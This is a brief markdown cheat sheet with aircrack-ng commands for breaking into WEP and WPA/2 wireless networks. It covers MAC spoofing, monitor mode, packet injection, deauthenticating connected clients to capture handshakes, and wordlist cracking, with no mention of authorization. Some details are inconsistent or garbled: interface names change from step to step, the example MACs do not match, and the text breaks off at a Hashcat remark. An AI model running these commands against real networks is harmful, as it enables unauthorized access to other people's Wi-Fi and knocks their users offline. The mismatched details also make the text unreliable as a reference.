# Hacking Wireless

### WEP

Configure Interface:

```
airmon-ng stop wlan0
ifconfig wlan0 down
macchanger --mac aa:bb:cc:dd:ee:ff wlan0
airmon-ng start wlan0
```

Scan for networks:

```
airodump-ng mon0
```

Target AP:

```
airodump-ng -c (channel) -w (file name) --bssid (bssid) mon0
```

Attack:

```
aireplay-ng -1 0 -a (bssid) -h aa:bb:cc:dd:ee:ff -e (essid) wlan0
aireplay-ng -3 -b (bssid) -h aa:bb:cc:dd:ee:ff wlan0
(captured data will have to be above 10,000 to crack)
```

Cracking:

```
aircrack-ng -b (bssid) (file_name-01.cap)
```

### WPA/2

Configure Interface:

```
ifconfig wlan0 down
airmon-ng stop wlan0
macchanger --mac=aa:bb:cc:dd:ee:ff wlan0
airmon-ng start wlan0
```

Scan for networks:

```
airodump-ng wlan0
```

Choose your target and then:

```
airodump-ng --channel 2 wlan0mon -w outputfile_name --bssid 00:1D:AA:9F:77:4C
```

Attack using AP MAC and Client MAC:

```
aireplay-ng -0 10 -a 00:04:96:2A:BB:EA -c 5C:59:48:0F:24:9A wlan0
aireplay-ng -0 1 -e thestudio... Wlan0mon

-0 means deauthentication
 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously
-a 00:14:6C:7E:40:80 is the MAC address of the access point
-c 00:0F:B5:34:30:30 is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated
ath0 is the interface name
```

Crack the handshake

```
aircrack-ng -w ~/Desktop/Wordlist/CRACKED_PASS.dic /root/Desktop/CapFileName
```

It is also possible to crack the hash using Hashcat (better method). You will need to convert the handshake first
